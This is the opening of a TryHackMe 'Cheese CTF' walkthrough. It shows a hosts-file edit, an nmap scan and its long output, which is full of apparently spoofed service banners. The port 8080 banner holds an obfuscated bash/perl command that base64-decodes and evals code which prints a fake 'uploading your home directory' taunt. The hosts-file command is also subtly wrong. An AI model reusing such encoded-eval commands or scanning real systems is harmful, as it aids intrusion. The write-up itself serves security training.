# Overview

## Cheese CTF

### Inspired by the great cheese talk of THM!

![](https://tryhackme.com/room/cheesectfv10)

add  your ip add to to /etc/hosts

```bash

$  sudo echo "cheese.thm         10.10.238.27" >> /etc/hosts

```


# Step 1 


run a scan against the ip address of your target:

```bash

$  nmap -p- -A -v -Pn cheese.thm

```

## Result

![](<img src=../../../../assets/images/chesse/image.png>)


```bash

 nmap --top-ports 20 -A -v --min-rate 100 --open  -Pn cheese.thm
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-18 16:34 WAT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
Initiating SYN Stealth Scan at 16:34
Scanning cheese.thm (10.10.198.98) [20 ports]
Discovered open port 135/tcp on 10.10.198.98
Discovered open port 995/tcp on 10.10.198.98
Discovered open port 1723/tcp on 10.10.198.98
Discovered open port 139/tcp on 10.10.198.98
Discovered open port 21/tcp on 10.10.198.98
Discovered open port 80/tcp on 10.10.198.98
Discovered open port 445/tcp on 10.10.198.98
Discovered open port 22/tcp on 10.10.198.98
Discovered open port 23/tcp on 10.10.198.98
Discovered open port 993/tcp on 10.10.198.98
Discovered open port 53/tcp on 10.10.198.98
Discovered open port 110/tcp on 10.10.198.98
Discovered open port 3306/tcp on 10.10.198.98
Discovered open port 8080/tcp on 10.10.198.98
Discovered open port 443/tcp on 10.10.198.98
Discovered open port 3389/tcp on 10.10.198.98
Increasing send delay for 10.10.198.98 from 0 to 5 due to max_successful_tryno increase to 4
Discovered open port 111/tcp on 10.10.198.98
Increasing send delay for 10.10.198.98 from 5 to 10 due to max_successful_tryno increase to 5
Discovered open port 5900/tcp on 10.10.198.98
Increasing send delay for 10.10.198.98 from 10 to 20 due to max_successful_tryno increase to 6
Discovered open port 143/tcp on 10.10.198.98
Increasing send delay for 10.10.198.98 from 20 to 40 due to max_successful_tryno increase to 7
Discovered open port 25/tcp on 10.10.198.98
Increasing send delay for 10.10.198.98 from 40 to 80 due to max_successful_tryno increase to 8
Completed SYN Stealth Scan at 16:34, 2.70s elapsed (20 total ports)
Initiating Service scan at 16:34
Scanning 20 services on cheese.thm (10.10.198.98)
Completed Service scan at 16:34, 32.84s elapsed (20 services on 1 host)
Initiating OS detection (try #1) against cheese.thm (10.10.198.98)
Retrying OS detection (try #2) against cheese.thm (10.10.198.98)
Initiating Traceroute at 16:34
Completed Traceroute at 16:34, 0.18s elapsed
Initiating Parallel DNS resolution of 1 host. at 16:34
Completed Parallel DNS resolution of 1 host. at 16:34, 2.38s elapsed
NSE: Script scanning 10.10.198.98.
Initiating NSE at 16:34
Completed NSE at 16:35, 25.07s elapsed
Initiating NSE at 16:35
Stats: 0:02:00 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE: Active NSE Script Threads: 4 (4 waiting)
NSE Timing: About 97.50% done; ETC: 16:36 (0:00:01 remaining)
Completed NSE at 16:36, 63.02s elapsed
Initiating NSE at 16:36
Completed NSE at 16:36, 0.01s elapsed
Nmap scan report for cheese.thm (10.10.198.98)
Host is up (0.16s latency).

PORT     STATE SERVICE      VERSION
21/tcp   open  ftp?
|_ftp-syst: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ftp-bounce: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|_    550 12345 0f7000f800770008777000000000000000f80008f7f70088000cf00
|_ftp-anon: ERROR: Script execution failed (use -d to debug)
22/tcp   open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d1:ef:24:c6:0b:6a:ff:db:fe:7b:97:66:96:03:90:bf (RSA)
|   256 e0:e4:ff:5d:66:9e:87:d1:ea:7a:66:7e:a7:3b:b7:30 (ECDSA)
|_  256 89:b8:88:83:e8:6e:35:0a:5b:cb:36:31:38:48:07:6e (ED25519)
23/tcp   open  telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe, tn3270: 
|_    550 12345 0f8008707ff07ff8000008088ff800000000f7000000f800808ff00
25/tcp   open  smtp?
|_smtp-commands: SMTP EHLO cheese.thm: failed to receive data: connection closed
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Hello, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|_    550 12345 0ff0808800cf0000ffff70000f877f70000c70008008ff8088fff00
53/tcp   open  domain?
|_dns-nsid: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   DNS-SD-TCP, DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    550 4m2v4 FUZZ_HERE
80/tcp   open  http         Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: The Cheese Shop
|_http-server-header: Apache/2.4.41 (Ubuntu)
110/tcp  open  irc          ircu ircd
111/tcp  open  http         RenderX XEP httpd (state: ..8..)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: XEP Engine: Status
|_http-favicon: Unknown favicon MD5: D31F1C9ED7BA781A0F142198429B16D6
135/tcp  open  sip          BT Home Hub 9r (Status: 500 Server Internal Error)
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LDAPSearchReq, LPDString, NULL, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     SIP/2.0 500 Server Internal Error
|_    User-Agent: BT Home Hub 9r
139/tcp  open  http         VCS AG VideoJet 1000 http config
|_http-server-header: VCS-VideoJet-Webserver
143/tcp  open  imap?
|_imap-capabilities: CAPABILITY
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Help, NULL, RPCCheck, RTSPRequest: 
|     000xa0
|     47196034657994Z
|     x02?:
|     qwv|
|_    krbtgt
443/tcp  open  https?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, OpenVPN, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, SSLv23SessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|_    -0000$| p|IBM OS/400 as-servermapd| o|OS/400
445/tcp  open  http         LogMeIn httpd 9980465
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: LogMeIn/9980465
|_http-title: Site doesn't have a title.
993/tcp  open  imaps?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NULL, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, SSLv23SessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.0 200 OK
|_    oServer: Linux,tcEZqv,UPnP/DpJ,Coherence UPnP framework,snNaXZ
|_imap-capabilities: CAPABILITY
995/tcp  open  smtp         Postfix smtpd (Debian)
|_smtp-commands: SMTP EHLO cheese.thm: failed to receive data: connection closed
1723/tcp open  telnet       BusyBox telnetd 1.00-pre7 - 1.14.0
| fingerprint-strings: 
|   GenericLines, GetRequest, Help, NCP, NULL, RPCCheck, SIPOptions, tn3270: 
|     Welcome to Linux (ZEM500) for MIPS
|     Kernel TbC uon an MIPS
|_    ZEM500 login:
3306/tcp open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NULL, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     0000
|     version
|_    bind00
3389/tcp open  imap         Microsoft Exchange Server 2003 imapd wZcGg (Spanish)
|_imap-capabilities: CAPABILITY
5900/tcp open  kerberos-sec Shishi kerberos-sec
8080/tcp open  http-proxy?
| fingerprint-strings: 
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, NULL, RTSPRequest, Socks4, Socks5: 
|_    /bin/bash -c {perl,-e,$0,useSPACEMIME::Base64,cHJpbnQgIlBXTkVEXG4iIHggNSA7ICRfPWBwd2RgOyBwcmludCAiXG51cGxvYWRpbmcgeW91ciBob21lIGRpcmVjdG9yeTogIiwkXywiLi4uIFxuXG4iOw==} $_=$ARGV[0];~s/SPACE/ /ig;eval;$_=$ARGV[1];eval(decode_base64($_));
9 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port21-TCP:V=7.95%I=7%D=6/18%Time=6852DC75%P=x86_64-pc-linux-gnu%r(NULL
SF:,41,"550\x2012345\x200f7000f800770008777000000000000000f80008f7f7008800
SF:0cf00")%r(GenericLines,41,"550\x2012345\x200f7000f800770008777000000000
SF:000000f80008f7f70088000cf00")%r(Help,41,"550\x2012345\x200f7000f8007700
SF:08777000000000000000f80008f7f70088000cf00")%r(GetRequest,41,"550\x20123
SF:45\x200f7000f800770008777000000000000000f80008f7f70088000cf00")%r(HTTPO
SF:ptions,41,"550\x2012345\x200f7000f800770008777000000000000000f80008f7f7
SF:0088000cf00")%r(RTSPRequest,41,"550\x2012345\x200f7000f8007700087770000
SF:00000000000f80008f7f70088000cf00")%r(RPCCheck,41,"550\x2012345\x200f700
SF:0f800770008777000000000000000f80008f7f70088000cf00")%r(DNSVersionBindRe
SF:qTCP,41,"550\x2012345\x200f7000f800770008777000000000000000f80008f7f700
SF:88000cf00")%r(DNSStatusRequestTCP,41,"550\x2012345\x200f7000f8007700087
SF:77000000000000000f80008f7f70088000cf00")%r(SSLSessionReq,41,"550\x20123
SF:45\x200f7000f800770008777000000000000000f80008f7f70088000cf00")%r(Termi
SF:nalServerCookie,41,"550\x2012345\x200f7000f800770008777000000000000000f
SF:80008f7f70088000cf00")%r(TLSSessionReq,41,"550\x2012345\x200f7000f80077
SF:0008777000000000000000f80008f7f70088000cf00")%r(Kerberos,41,"550\x20123
SF:45\x200f7000f800770008777000000000000000f80008f7f70088000cf00")%r(SMBPr
SF:ogNeg,41,"550\x2012345\x200f7000f800770008777000000000000000f80008f7f70
SF:088000cf00")%r(X11Probe,41,"550\x2012345\x200f7000f80077000877700000000
SF:0000000f80008f7f70088000cf00")%r(FourOhFourRequest,41,"550\x2012345\x20
SF:0f7000f800770008777000000000000000f80008f7f70088000cf00")%r(LPDString,4
SF:1,"550\x2012345\x200f7000f800770008777000000000000000f80008f7f70088000c
SF:f00")%r(LDAPSearchReq,41,"550\x2012345\x200f7000f8007700087770000000000
SF:00000f80008f7f70088000cf00")%r(LDAPBindReq,41,"550\x2012345\x200f7000f8
SF:00770008777000000000000000f80008f7f70088000cf00")%r(SIPOptions,41,"550\
SF:x2012345\x200f7000f800770008777000000000000000f80008f7f70088000cf00")%r
SF:(LANDesk-RC,41,"550\x2012345\x200f7000f800770008777000000000000000f8000
SF:8f7f70088000cf00")%r(TerminalServer,41,"550\x2012345\x200f7000f80077000
SF:8777000000000000000f80008f7f70088000cf00");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port23-TCP:V=7.95%I=7%D=6/18%Time=6852DC74%P=x86_64-pc-linux-gnu%r(NULL
SF:,41,"550\x2012345\x200f8008707ff07ff8000008088ff800000000f7000000f80080
SF:8ff00")%r(GenericLines,41,"550\x2012345\x200f8008707ff07ff8000008088ff8
SF:00000000f7000000f800808ff00")%r(tn3270,41,"550\x2012345\x200f8008707ff0
SF:7ff8000008088ff800000000f7000000f800808ff00")%r(GetRequest,41,"550\x201
SF:2345\x200f8008707ff07ff8000008088ff800000000f7000000f800808ff00")%r(HTT
SF:POptions,41,"550\x2012345\x200f8008707ff07ff8000008088ff800000000f70000
SF:00f800808ff00")%r(RTSPRequest,41,"550\x2012345\x200f8008707ff07ff800000
SF:8088ff800000000f7000000f800808ff00")%r(RPCCheck,41,"550\x2012345\x200f8
SF:008707ff07ff8000008088ff800000000f7000000f800808ff00")%r(DNSVersionBind
SF:ReqTCP,41,"550\x2012345\x200f8008707ff07ff8000008088ff800000000f7000000
SF:f800808ff00")%r(DNSStatusRequestTCP,41,"550\x2012345\x200f8008707ff07ff
SF:8000008088ff800000000f7000000f800808ff00")%r(Help,41,"550\x2012345\x200
SF:f8008707ff07ff8000008088ff800000000f7000000f800808ff00")%r(SSLSessionRe
SF:q,41,"550\x2012345\x200f8008707ff07ff8000008088ff800000000f7000000f8008
SF:08ff00")%r(TerminalServerCookie,41,"550\x2012345\x200f8008707ff07ff8000
SF:008088ff800000000f7000000f800808ff00")%r(TLSSessionReq,41,"550\x2012345
SF:\x200f8008707ff07ff8000008088ff800000000f7000000f800808ff00")%r(Kerbero
SF:s,41,"550\x2012345\x200f8008707ff07ff8000008088ff800000000f7000000f8008
SF:08ff00")%r(SMBProgNeg,41,"550\x2012345\x200f8008707ff07ff8000008088ff80
SF:0000000f7000000f800808ff00")%r(X11Probe,41,"550\x2012345\x200f8008707ff
SF:07ff8000008088ff800000000f7000000f800808ff00")%r(FourOhFourRequest,41,"
SF:550\x2012345\x200f8008707ff07ff8000008088ff800000000f7000000f800808ff00
SF:")%r(LPDString,41,"550\x2012345\x200f8008707ff07ff8000008088ff800000000
SF:f7000000f800808ff00")%r(LDAPSearchReq,41,"550\x2012345\x200f8008707ff07
SF:ff8000008088ff800000000f7000000f800808ff00")%r(LDAPBindReq,41,"550\x201
SF:2345\x200f8008707ff07ff8000008088ff800000000f7000000f800808ff00")%r(SIP
SF:Options,41,"550\x2012345\x200f8008707ff07ff8000008088ff800000000f700000
SF:0f800808ff00")%r(LANDesk-RC,41,"550\x2012345\x200f8008707ff07ff80000080
SF:88ff800000000f7000000f800808ff00");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port25-TCP:V=7.95%I=7%D=6/18%Time=6852DC75%P=x86_64-pc-linux-gnu%r(NULL
SF:,41,"550\x2012345\x200ff0808800cf0000ffff70000f877f70000c70008008ff8088
SF:fff00")%r(Hello,41,"550\x2012345\x200ff0808800cf0000ffff70000f877f70000
SF:c70008008ff8088fff00")%r(Help,41,"550\x2012345\x200ff0808800cf0000ffff7
SF:0000f877f70000c70008008ff8088fff00")%r(GenericLines,41,"550\x2012345\x2
SF:00ff0808800cf0000ffff70000f877f70000c70008008ff8088fff00")%r(GetRequest
SF:,41,"550\x2012345\x200ff0808800cf0000ffff70000f877f70000c70008008ff8088
SF:fff00")%r(HTTPOptions,41,"550\x2012345\x200ff0808800cf0000ffff70000f877
SF:f70000c70008008ff8088fff00")%r(RTSPRequest,41,"550\x2012345\x200ff08088
SF:00cf0000ffff70000f877f70000c70008008ff8088fff00")%r(RPCCheck,41,"550\x2
SF:012345\x200ff0808800cf0000ffff70000f877f70000c70008008ff8088fff00")%r(D
SF:NSVersionBindReqTCP,41,"550\x2012345\x200ff0808800cf0000ffff70000f877f7
SF:0000c70008008ff8088fff00")%r(DNSStatusRequestTCP,41,"550\x2012345\x200f
SF:f0808800cf0000ffff70000f877f70000c70008008ff8088fff00")%r(SSLSessionReq
SF:,41,"550\x2012345\x200ff0808800cf0000ffff70000f877f70000c70008008ff8088
SF:fff00")%r(TerminalServerCookie,41,"550\x2012345\x200ff0808800cf0000ffff
SF:70000f877f70000c70008008ff8088fff00")%r(TLSSessionReq,41,"550\x2012345\
SF:x200ff0808800cf0000ffff70000f877f70000c70008008ff8088fff00")%r(Kerberos
SF:,41,"550\x2012345\x200ff0808800cf0000ffff70000f877f70000c70008008ff8088
SF:fff00")%r(SMBProgNeg,41,"550\x2012345\x200ff0808800cf0000ffff70000f877f
SF:70000c70008008ff8088fff00")%r(X11Probe,41,"550\x2012345\x200ff0808800cf
SF:0000ffff70000f877f70000c70008008ff8088fff00")%r(FourOhFourRequest,41,"5
SF:50\x2012345\x200ff0808800cf0000ffff70000f877f70000c70008008ff8088fff00"
SF:)%r(LPDString,41,"550\x2012345\x200ff0808800cf0000ffff70000f877f70000c7
SF:0008008ff8088fff00")%r(LDAPSearchReq,41,"550\x2012345\x200ff0808800cf00
SF:00ffff70000f877f70000c70008008ff8088fff00")%r(LDAPBindReq,41,"550\x2012
SF:345\x200ff0808800cf0000ffff70000f877f70000c70008008ff8088fff00")%r(SIPO
SF:ptions,41,"550\x2012345\x200ff0808800cf0000ffff70000f877f70000c70008008
SF:ff8088fff00")%r(LANDesk-RC,41,"550\x2012345\x200ff0808800cf0000ffff7000
SF:0f877f70000c70008008ff8088fff00");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port53-TCP:V=7.95%I=7%D=6/18%Time=6852DC75%P=x86_64-pc-linux-gnu%r(NULL
SF:,13,"550\x204m2v4\x20FUZZ_HERE")%r(DNSVersionBindReqTCP,13,"550\x204m2v
SF:4\x20FUZZ_HERE")%r(DNSStatusRequestTCP,13,"550\x204m2v4\x20FUZZ_HERE")%
SF:r(DNS-SD-TCP,13,"550\x204m2v4\x20FUZZ_HERE")%r(GenericLines,13,"550\x20
SF:4m2v4\x20FUZZ_HERE")%r(GetRequest,13,"550\x204m2v4\x20FUZZ_HERE")%r(HTT
SF:POptions,13,"550\x204m2v4\x20FUZZ_HERE")%r(RTSPRequest,13,"550\x204m2v4
SF:\x20FUZZ_HERE")%r(RPCCheck,13,"550\x204m2v4\x20FUZZ_HERE")%r(Help,13,"5
SF:50\x204m2v4\x20FUZZ_HERE")%r(SSLSessionReq,13,"550\x204m2v4\x20FUZZ_HER
SF:E")%r(TerminalServerCookie,13,"550\x204m2v4\x20FUZZ_HERE")%r(TLSSession
SF:Req,13,"550\x204m2v4\x20FUZZ_HERE")%r(Kerberos,13,"550\x204m2v4\x20FUZZ
SF:_HERE")%r(SMBProgNeg,13,"550\x204m2v4\x20FUZZ_HERE")%r(X11Probe,13,"550
SF:\x204m2v4\x20FUZZ_HERE")%r(FourOhFourRequest,13,"550\x204m2v4\x20FUZZ_H
SF:ERE")%r(LPDString,13,"550\x204m2v4\x20FUZZ_HERE")%r(LDAPSearchReq,13,"5
SF:50\x204m2v4\x20FUZZ_HERE")%r(LDAPBindReq,13,"550\x204m2v4\x20FUZZ_HERE"
SF:)%r(SIPOptions,13,"550\x204m2v4\x20FUZZ_HERE")%r(LANDesk-RC,13,"550\x20
SF:4m2v4\x20FUZZ_HERE")%r(TerminalServer,13,"550\x204m2v4\x20FUZZ_HERE")%r
SF:(NCP,13,"550\x204m2v4\x20FUZZ_HERE")%r(NotesRPC,13,"550\x204m2v4\x20FUZ
SF:Z_HERE")%r(JavaRMI,13,"550\x204m2v4\x20FUZZ_HERE")%r(WMSRequest,13,"550
SF:\x204m2v4\x20FUZZ_HERE")%r(oracle-tns,13,"550\x204m2v4\x20FUZZ_HERE")%r
SF:(ms-sql-s,13,"550\x204m2v4\x20FUZZ_HERE")%r(afp,13,"550\x204m2v4\x20FUZ
SF:Z_HERE")%r(giop,13,"550\x204m2v4\x20FUZZ_HERE");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port135-TCP:V=7.95%I=7%D=6/18%Time=6852DC74%P=x86_64-pc-linux-gnu%r(NUL
SF:L,42,"SIP/2\.0\x20500\x20Server\x20Internal\x20Error\r\nc\r\nUser-Agent
SF::\x20BT\x20Home\x20Hub\x209r\n\n")%r(DNSVersionBindReqTCP,42,"SIP/2\.0\
SF:x20500\x20Server\x20Internal\x20Error\r\nc\r\nUser-Agent:\x20BT\x20Home
SF:\x20Hub\x209r\n\n")%r(SMBProgNeg,42,"SIP/2\.0\x20500\x20Server\x20Inter
SF:nal\x20Error\r\nc\r\nUser-Agent:\x20BT\x20Home\x20Hub\x209r\n\n")%r(Gen
SF:ericLines,42,"SIP/2\.0\x20500\x20Server\x20Internal\x20Error\r\nc\r\nUs
SF:er-Agent:\x20BT\x20Home\x20Hub\x209r\n\n")%r(GetRequest,42,"SIP/2\.0\x2
SF:0500\x20Server\x20Internal\x20Error\r\nc\r\nUser-Agent:\x20BT\x20Home\x
SF:20Hub\x209r\n\n")%r(HTTPOptions,42,"SIP/2\.0\x20500\x20Server\x20Intern
SF:al\x20Error\r\nc\r\nUser-Agent:\x20BT\x20Home\x20Hub\x209r\n\n")%r(RTSP
SF:Request,42,"SIP/2\.0\x20500\x20Server\x20Internal\x20Error\r\nc\r\nUser
SF:-Agent:\x20BT\x20Home\x20Hub\x209r\n\n")%r(RPCCheck,42,"SIP/2\.0\x20500
SF:\x20Server\x20Internal\x20Error\r\nc\r\nUser-Agent:\x20BT\x20Home\x20Hu
SF:b\x209r\n\n")%r(DNSStatusRequestTCP,42,"SIP/2\.0\x20500\x20Server\x20In
SF:ternal\x20Error\r\nc\r\nUser-Agent:\x20BT\x20Home\x20Hub\x209r\n\n")%r(
SF:Help,42,"SIP/2\.0\x20500\x20Server\x20Internal\x20Error\r\nc\r\nUser-Ag
SF:ent:\x20BT\x20Home\x20Hub\x209r\n\n")%r(SSLSessionReq,42,"SIP/2\.0\x205
SF:00\x20Server\x20Internal\x20Error\r\nc\r\nUser-Agent:\x20BT\x20Home\x20
SF:Hub\x209r\n\n")%r(TerminalServerCookie,42,"SIP/2\.0\x20500\x20Server\x2
SF:0Internal\x20Error\r\nc\r\nUser-Agent:\x20BT\x20Home\x20Hub\x209r\n\n")
SF:%r(TLSSessionReq,42,"SIP/2\.0\x20500\x20Server\x20Internal\x20Error\r\n
SF:c\r\nUser-Agent:\x20BT\x20Home\x20Hub\x209r\n\n")%r(Kerberos,42,"SIP/2\
SF:.0\x20500\x20Server\x20Internal\x20Error\r\nc\r\nUser-Agent:\x20BT\x20H
SF:ome\x20Hub\x209r\n\n")%r(X11Probe,42,"SIP/2\.0\x20500\x20Server\x20Inte
SF:rnal\x20Error\r\nc\r\nUser-Agent:\x20BT\x20Home\x20Hub\x209r\n\n")%r(Fo
SF:urOhFourRequest,42,"SIP/2\.0\x20500\x20Server\x20Internal\x20Error\r\nc
SF:\r\nUser-Agent:\x20BT\x20Home\x20Hub\x209r\n\n")%r(LPDString,42,"SIP/2\
SF:.0\x20500\x20Server\x20Internal\x20Error\r\nc\r\nUser-Agent:\x20BT\x20H
SF:ome\x20Hub\x209r\n\n")%r(LDAPSearchReq,42,"SIP/2\.0\x20500\x20Server\x2
SF:0Internal\x20Error\r\nc\r\nUser-Agent:\x20BT\x20Home\x20Hub\x209r\n\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port143-TCP:V=7.95%I=7%D=6/18%Time=6852DC75%P=x86_64-pc-linux-gnu%r(NUL
SF:L,58,"000xa0\x03\x02\x01\x05\xa1\x03\x02\x01\x1e\xa4\x11\x18\x0f4719603
SF:4657994Z\xa5x02\?:\x03qwv\|\x02uy\|\x01n\xa6\x03\x02\x01D\xa9\x04\x1b\x
SF:02NM\xaa\x170\x15\xa0\x03\x02\x010\xa1\x0e0\x0c\x1b\x06krbtgt\x1b\x02NM
SF:\n")%r(GetRequest,58,"000xa0\x03\x02\x01\x05\xa1\x03\x02\x01\x1e\xa4\x1
SF:1\x18\x0f47196034657994Z\xa5x02\?:\x03qwv\|\x02uy\|\x01n\xa6\x03\x02\x0
SF:1D\xa9\x04\x1b\x02NM\xaa\x170\x15\xa0\x03\x02\x010\xa1\x0e0\x0c\x1b\x06
SF:krbtgt\x1b\x02NM\n")%r(GenericLines,58,"000xa0\x03\x02\x01\x05\xa1\x03\
SF:x02\x01\x1e\xa4\x11\x18\x0f47196034657994Z\xa5x02\?:\x03qwv\|\x02uy\|\x
SF:01n\xa6\x03\x02\x01D\xa9\x04\x1b\x02NM\xaa\x170\x15\xa0\x03\x02\x010\xa
SF:1\x0e0\x0c\x1b\x06krbtgt\x1b\x02NM\n")%r(HTTPOptions,58,"000xa0\x03\x02
SF:\x01\x05\xa1\x03\x02\x01\x1e\xa4\x11\x18\x0f47196034657994Z\xa5x02\?:\x
SF:03qwv\|\x02uy\|\x01n\xa6\x03\x02\x01D\xa9\x04\x1b\x02NM\xaa\x170\x15\xa
SF:0\x03\x02\x010\xa1\x0e0\x0c\x1b\x06krbtgt\x1b\x02NM\n")%r(RTSPRequest,5
SF:8,"000xa0\x03\x02\x01\x05\xa1\x03\x02\x01\x1e\xa4\x11\x18\x0f4719603465
SF:7994Z\xa5x02\?:\x03qwv\|\x02uy\|\x01n\xa6\x03\x02\x01D\xa9\x04\x1b\x02N
SF:M\xaa\x170\x15\xa0\x03\x02\x010\xa1\x0e0\x0c\x1b\x06krbtgt\x1b\x02NM\n"
SF:)%r(RPCCheck,58,"000xa0\x03\x02\x01\x05\xa1\x03\x02\x01\x1e\xa4\x11\x18
SF:\x0f47196034657994Z\xa5x02\?:\x03qwv\|\x02uy\|\x01n\xa6\x03\x02\x01D\xa
SF:9\x04\x1b\x02NM\xaa\x170\x15\xa0\x03\x02\x010\xa1\x0e0\x0c\x1b\x06krbtg
SF:t\x1b\x02NM\n")%r(DNSVersionBindReqTCP,58,"000xa0\x03\x02\x01\x05\xa1\x
SF:03\x02\x01\x1e\xa4\x11\x18\x0f47196034657994Z\xa5x02\?:\x03qwv\|\x02uy\
SF:|\x01n\xa6\x03\x02\x01D\xa9\x04\x1b\x02NM\xaa\x170\x15\xa0\x03\x02\x010
SF:\xa1\x0e0\x0c\x1b\x06krbtgt\x1b\x02NM\n")%r(DNSStatusRequestTCP,58,"000
SF:xa0\x03\x02\x01\x05\xa1\x03\x02\x01\x1e\xa4\x11\x18\x0f47196034657994Z\
SF:xa5x02\?:\x03qwv\|\x02uy\|\x01n\xa6\x03\x02\x01D\xa9\x04\x1b\x02NM\xaa\
SF:x170\x15\xa0\x03\x02\x010\xa1\x0e0\x0c\x1b\x06krbtgt\x1b\x02NM\n")%r(He
SF:lp,58,"000xa0\x03\x02\x01\x05\xa1\x03\x02\x01\x1e\xa4\x11\x18\x0f471960
SF:34657994Z\xa5x02\?:\x03qwv\|\x02uy\|\x01n\xa6\x03\x02\x01D\xa9\x04\x1b\
SF:x02NM\xaa\x170\x15\xa0\x03\x02\x010\xa1\x0e0\x0c\x1b\x06krbtgt\x1b\x02N
SF:M\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port443-TCP:V=7.95%I=7%D=6/18%Time=6852DC75%P=x86_64-pc-linux-gnu%r(NUL
SF:L,2D,"-0000\$\|\x20p\|IBM\x20OS/400\x20as-servermapd\|\x20o\|OS/400\n")
SF:%r(SSLSessionReq,2D,"-0000\$\|\x20p\|IBM\x20OS/400\x20as-servermapd\|\x
SF:20o\|OS/400\n")%r(TLSSessionReq,2D,"-0000\$\|\x20p\|IBM\x20OS/400\x20as
SF:-servermapd\|\x20o\|OS/400\n")%r(SSLv23SessionReq,2D,"-0000\$\|\x20p\|I
SF:BM\x20OS/400\x20as-servermapd\|\x20o\|OS/400\n")%r(X11Probe,2D,"-0000\$
SF:\|\x20p\|IBM\x20OS/400\x20as-servermapd\|\x20o\|OS/400\n")%r(OpenVPN,2D
SF:,"-0000\$\|\x20p\|IBM\x20OS/400\x20as-servermapd\|\x20o\|OS/400\n")%r(G
SF:enericLines,2D,"-0000\$\|\x20p\|IBM\x20OS/400\x20as-servermapd\|\x20o\|
SF:OS/400\n")%r(GetRequest,2D,"-0000\$\|\x20p\|IBM\x20OS/400\x20as-serverm
SF:apd\|\x20o\|OS/400\n")%r(HTTPOptions,2D,"-0000\$\|\x20p\|IBM\x20OS/400\
SF:x20as-servermapd\|\x20o\|OS/400\n")%r(RTSPRequest,2D,"-0000\$\|\x20p\|I
